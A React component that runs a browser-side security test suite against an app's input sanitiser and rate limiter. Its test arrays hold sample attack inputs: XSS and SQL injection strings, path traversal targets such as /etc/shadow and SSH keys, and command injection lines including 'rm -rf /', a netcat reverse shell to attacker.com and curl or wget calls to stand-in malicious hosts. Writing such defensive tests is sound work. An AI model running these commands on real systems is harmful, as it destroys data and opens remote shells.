import React, { useState, useEffect } from 'react';
import { 
  sanitizeInput, 
  rateLimit, 
  reportSecurityEvent, 
  getSecurityEvents, 
  clearSecurityEvents,
  initializeSecurity 
} from '../utils/security.js';

/**
 * SecurityTest - Component to test and verify security measures
 * Useful for testing security implementations and monitoring threats
 */
const SecurityTest = ({ onClose }) => {
  const [testResults, setTestResults] = useState([]);
  const [securityEvents, setSecurityEvents] = useState([]);
  const [isRunning, setIsRunning] = useState(false);
  const [testInput, setTestInput] = useState('');

  useEffect(() => {
    // Load existing security events
    setSecurityEvents(getSecurityEvents());
  }, []);

  const securityTests = [
    {
      name: 'XSS Prevention',
      description: 'Test protection against Cross-Site Scripting attacks',
      test: () => {
        const maliciousInputs = [
          '<script>alert("XSS")</script>',
          'javascript:alert("XSS")',
          '<img src="x" onerror="alert(\'XSS\')">',
          '<svg onload="alert(\'XSS\')">',
          '&#60;script&#62;alert("XSS")&#60;/script&#62;',
          'eval("alert(\'XSS\')")',
          '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ];

        const results = maliciousInputs.map(input => {
          const sanitized = sanitizeInput(input);
          const blocked = !sanitized.includes('script') && 
                         !sanitized.includes('javascript:') && 
                         !sanitized.includes('onerror') &&
                         !sanitized.includes('onload') &&
                         !sanitized.includes('eval');
          
          return {
            input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
            sanitized: sanitized.substring(0, 50) + (sanitized.length > 50 ? '...' : ''),
            blocked,
            status: blocked ? 'PASS' : 'FAIL'
          };
        });

        return {
          passed: results.every(r => r.blocked),
          details: results
        };
      }
    },
    {
      name: 'SQL Injection Prevention',
      description: 'Test protection against SQL injection attacks',
      test: () => {
        const sqlInputs = [
          "'; DROP TABLE users; --",
          "1' OR '1'='1",
          "admin'--",
          "1' UNION SELECT * FROM users--",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
          "1' OR 1=1#",
          "' OR 'a'='a"
        ];

        const results = sqlInputs.map(input => {
          const sanitized = sanitizeInput(input);
          const blocked = !sanitized.includes('DROP') && 
                         !sanitized.includes('UNION') && 
                         !sanitized.includes('INSERT') &&
                         !sanitized.includes('--') &&
                         !sanitized.includes("'");
          
          return {
            input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
            sanitized: sanitized.substring(0, 50) + (sanitized.length > 50 ? '...' : ''),
            blocked,
            status: blocked ? 'PASS' : 'FAIL'
          };
        });

        return {
          passed: results.every(r => r.blocked),
          details: results
        };
      }
    },
    {
      name: 'Path Traversal Prevention',
      description: 'Test protection against directory traversal attacks',
      test: () => {
        const pathInputs = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '/etc/shadow',
          '../../../../root/.ssh/id_rsa',
          '../../../var/log/apache2/access.log',
          '..\\..\\..\\boot.ini'
        ];

        const results = pathInputs.map(input => {
          const sanitized = sanitizeInput(input);
          const blocked = !sanitized.includes('..') && 
                         !sanitized.includes('/etc/') && 
                         !sanitized.includes('\\windows\\') &&
                         !sanitized.includes('/var/') &&
                         !sanitized.includes('/root/');
          
          return {
            input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
            sanitized: sanitized.substring(0, 50) + (sanitized.length > 50 ? '...' : ''),
            blocked,
            status: blocked ? 'PASS' : 'FAIL'
          };
        });

        return {
          passed: results.every(r => r.blocked),
          details: results
        };
      }
    },
    {
      name: 'Command Injection Prevention',
      description: 'Test protection against command injection attacks',
      test: () => {
        const commandInputs = [
          '; rm -rf /',
          '| cat /etc/passwd',
          '&& wget malicious.com/script.sh',
          '`whoami`',
          '$(id)',
          '; nc -e /bin/sh attacker.com 4444',
          '|| curl evil.com/steal.php'
        ];

        const results = commandInputs.map(input => {
          const sanitized = sanitizeInput(input);
          const blocked = !sanitized.includes(';') && 
                         !sanitized.includes('|') && 
                         !sanitized.includes('&') &&
                         !sanitized.includes('`') &&
                         !sanitized.includes('$(') &&
                         !sanitized.includes('rm ') &&
                         !sanitized.includes('wget ');
          
          return {
            input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
            sanitized: sanitized.substring(0, 50) + (sanitized.length > 50 ? '...' : ''),
            blocked,
            status: blocked ? 'PASS' : 'FAIL'
          };
        });

        return {
          passed: results.every(r => r.blocked),
          details: results
        };
      }
    },
    {
      name: 'Rate Limiting',
      description: 'Test rate limiting functionality',
      test: () => {
        const testKey = 'security_test_' + Date.now();
        const results = [];
        
        // Test normal usage (should pass)
        for (let i = 0; i < 3; i++) {
          const allowed = rateLimit(testKey, 5, 60000);
          results.push({
            attempt: i + 1,
            allowed,
            status: allowed ? 'PASS' : 'FAIL'
          });
        }
        
        // Test rate limit exceeded (should fail)
        for (let i = 0; i < 5; i++) {
          const allowed = rateLimit(testKey, 5, 60000);
          results.push({
            attempt: i + 4,
            allowed,
            status: i < 2 ? (allowed ? 'PASS' : 'FAIL') : (!allowed ? 'PASS' : 'FAIL')
          });
        }

        return {
          passed: results.slice(0, 5).every(r => r.allowed) && 
                 results.slice(5).every(r => !r.allowed),
          details: results
        };
      }
    },
    {
      name: 'Input Length Validation',
      description: 'Test input length restrictions',
      test: () => {
        const longInput = 'A'.repeat(2000);
        const normalInput = 'Normal input';
        
        const longResult = sanitizeInput(longInput, { maxLength: 1000 });
        const normalResult = sanitizeInput(normalInput, { maxLength: 1000 });
        
        const results = [
          {
            input: 'Long input (2000 chars)',
            sanitized: `Truncated to ${longResult.length} chars`,
            blocked: longResult.length <= 1000,
            status: longResult.length <= 1000 ? 'PASS' : 'FAIL'
          },
          {
            input: 'Normal input',
            sanitized: normalResult,
            blocked: normalResult === normalInput,
            status: normalResult === normalInput ? 'PASS' : 'FAIL'
          }
        ];

        return {
          passed: results.every(r => r.blocked),
          details: results
        };
      }
    }
  ];

  const runSecurityTests = async () => {
    setIsRunning(true);
    setTestResults([]);

    const results = [];

    for (const test of securityTests) {
      try {
        console.log(`Running security test: ${test.name}`);
        const result = test.test();
        
        results.push({
          name: test.name,
          description: test.description,
          passed: result.passed,
          details: result.details,
          status: result.passed ? 'PASS' : 'FAIL'
        });

        // Update UI progressively
        setTestResults([...results]);
        
        // Small delay for UI updates
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        results.push({
          name: test.name,
          description: test.description,
          passed: false,
          error: error.message,
          status: 'ERROR'
        });
        setTestResults([...results]);
      }
    }

    // Report test completion
    reportSecurityEvent('security_test_completed', {
      severity: 'low',
      totalTests: results.length,
      passedTests: results.filter(r => r.passed).length,
      failedTests: results.filter(r => !r.passed).length
    });

    setIsRunning(false);
  };

  const testCustomInput = () => {
    if (!testInput.trim()) return;

    const sanitized = sanitizeInput(testInput);
    const result = {
      name: 'Custom Input Test',
      description: 'Test custom input for security threats',
      input: testInput,
      sanitized,
      threats: testInput !== sanitized,
      status: testInput !== sanitized ? 'THREATS_DETECTED' : 'CLEAN'
    };

    setTestResults(prev => [result, ...prev]);
    reportSecurityEvent('custom_input_test', {
      severity: result.threats ? 'medium' : 'low',
      inputLength: testInput.length,
      threatsDetected: result.threats
    });
  };

  const getStatusColor = (status) => {
    switch (status) {
      case 'PASS': return '#4CAF50';
      case 'FAIL': return '#F44336';
      case 'ERROR': return '#9C27B0';
      case 'THREATS_DETECTED': return '#FF9800';
      case 'CLEAN': return '#4CAF50';
      default: return '#757575';
    }
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case 'PASS': return '✅';
      case 'FAIL': return '❌';
      case 'ERROR': return '🚫';
      case 'THREATS_DETECTED': return '⚠️';
      case 'CLEAN': return '✅';
      default: return '❓';
    }
  };

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.8)',
      zIndex: 10000,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div style={{
        backgroundColor: 'white',
        borderRadius: '8px',
        padding: '20px',
        maxWidth: '1000px',
        width: '100%',
        maxHeight: '90vh',
        overflow: 'auto'
      }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
          <h2>🔒 Security Test Suite</h2>
          <button 
            onClick={onClose}
            style={{
              background: '#f44336',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              padding: '8px 16px',
              cursor: 'pointer'
            }}
          >
            Close
          </button>
        </div>

        {/* Test Controls */}
        <div style={{ marginBottom: '20px', display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
          <button
            onClick={runSecurityTests}
            disabled={isRunning}
            style={{
              background: isRunning ? '#ccc' : '#4CAF50',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              padding: '12px 24px',
              cursor: isRunning ? 'not-allowed' : 'pointer',
              fontSize: '16px'
            }}
          >
            {isRunning ? '🔄 Running Tests...' : '🚀 Run Security Tests'}
          </button>

          <button
            onClick={() => setSecurityEvents(getSecurityEvents())}
            style={{
              background: '#2196F3',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              padding: '12px 24px',
              cursor: 'pointer'
            }}
          >
            📊 Refresh Events
          </button>

          <button
            onClick={() => {
              clearSecurityEvents();
              setSecurityEvents([]);
            }}
            style={{
              background: '#FF9800',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              padding: '12px 24px',
              cursor: 'pointer'
            }}
          >
            🗑️ Clear Events
          </button>
        </div>

        {/* Custom Input Test */}
        <div style={{
          backgroundColor: '#f5f5f5',
          padding: '15px',
          borderRadius: '4px',
          marginBottom: '20px'
        }}>
          <h3>🧪 Custom Input Test</h3>
          <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
            <input
              type="text"
              value={testInput}
              onChange={(e) => setTestInput(e.target.value)}
              placeholder="Enter potentially malicious input to test..."
              style={{
                flex: 1,
                padding: '8px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px'
              }}
            />
            <button
              onClick={testCustomInput}
              disabled={!testInput.trim()}
              style={{
                background: testInput.trim() ? '#4CAF50' : '#ccc',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '8px 16px',
                cursor: testInput.trim() ? 'pointer' : 'not-allowed'
              }}
            >
              Test Input
            </button>
          </div>
        </div>

        {/* Test Results */}
        {testResults.length > 0 && (
          <div style={{ marginBottom: '20px' }}>
            <h3>📋 Test Results</h3>
            <div style={{ display: 'grid', gap: '10px' }}>
              {testResults.map((result, index) => (
                <div
                  key={index}
                  style={{
                    border: `2px solid ${getStatusColor(result.status)}`,
                    borderRadius: '4px',
                    padding: '15px',
                    backgroundColor: result.status === 'PASS' ? '#f8fff8' : 
                                   result.status === 'FAIL' ? '#fff8f8' : 
                                   result.status === 'THREATS_DETECTED' ? '#fff8f0' : '#f8f8ff'
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                    <span style={{ fontSize: '20px', marginRight: '10px' }}>
                      {getStatusIcon(result.status)}
                    </span>
                    <strong>{result.name}</strong>
                    <span style={{ 
                      marginLeft: 'auto', 
                      color: getStatusColor(result.status),
                      fontWeight: 'bold'
                    }}>
                      {result.status}
                    </span>
                  </div>
                  
                  <p style={{ margin: '0 0 10px 0', color: '#666' }}>{result.description}</p>
                  
                  {result.error && (
                    <div style={{ color: '#f44336', marginBottom: '10px' }}>
                      <strong>Error:</strong> {result.error}
                    </div>
                  )}

                  {result.input && (
                    <div style={{ fontSize: '14px', marginBottom: '10px' }}>
                      <div><strong>Input:</strong> {result.input}</div>
                      <div><strong>Sanitized:</strong> {result.sanitized}</div>
                    </div>
                  )}

                  {result.details && (
                    <details style={{ marginTop: '10px' }}>
                      <summary style={{ cursor: 'pointer', fontWeight: 'bold' }}>
                        View Details ({result.details.length} tests)
                      </summary>
                      <div style={{ marginTop: '10px', maxHeight: '200px', overflow: 'auto' }}>
                        {result.details.map((detail, i) => (
                          <div key={i} style={{ 
                            padding: '5px', 
                            margin: '2px 0',
                            backgroundColor: detail.status === 'PASS' ? '#e8f5e8' : '#ffe8e8',
                            borderRadius: '2px',
                            fontSize: '12px'
                          }}>
                            <div><strong>{detail.status}:</strong> {detail.input}</div>
                            {detail.sanitized && <div><em>→ {detail.sanitized}</em></div>}
                          </div>
                        ))}
                      </div>
                    </details>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Security Events */}
        {securityEvents.length > 0 && (
          <div>
            <h3>🚨 Security Events ({securityEvents.length})</h3>
            <div style={{ maxHeight: '300px', overflow: 'auto' }}>
              {securityEvents.slice(0, 10).map((event, index) => (
                <div
                  key={index}
                  style={{
                    border: '1px solid #ddd',
                    borderRadius: '4px',
                    padding: '10px',
                    margin: '5px 0',
                    backgroundColor: event.severity === 'high' ? '#ffebee' :
                                   event.severity === 'medium' ? '#fff3e0' : '#f3e5f5'
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <strong>{event.type}</strong>
                    <span style={{ 
                      fontSize: '12px', 
                      color: event.severity === 'high' ? '#d32f2f' :
                             event.severity === 'medium' ? '#f57c00' : '#7b1fa2'
                    }}>
                      {event.severity?.toUpperCase()}
                    </span>
                  </div>
                  <div style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>
                    {new Date(event.timestamp).toLocaleString()}
                  </div>
                  {event.threats && (
                    <div style={{ fontSize: '12px', marginTop: '5px' }}>
                      <strong>Threats:</strong> {event.threats.join(', ')}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Instructions */}
        <div style={{
          marginTop: '20px',
          padding: '15px',
          backgroundColor: '#e3f2fd',
          borderRadius: '4px',
          fontSize: '14px'
        }}>
          <h4>📋 Security Test Information</h4>
          <ul style={{ margin: 0, paddingLeft: '20px' }}>
            <li><strong>XSS Prevention:</strong> Tests protection against script injection</li>
            <li><strong>SQL Injection:</strong> Tests database query protection</li>
            <li><strong>Path Traversal:</strong> Tests file system access protection</li>
            <li><strong>Command Injection:</strong> Tests system command protection</li>
            <li><strong>Rate Limiting:</strong> Tests request throttling</li>
            <li><strong>Input Validation:</strong> Tests length and format restrictions</li>
          </ul>
          <p style={{ margin: '10px 0 0 0' }}>
            <strong>Note:</strong> All tests should PASS for proper security. Failed tests indicate 
            potential vulnerabilities that need attention.
          </p>
        </div>
      </div>
    </div>
  );
};

export default SecurityTest;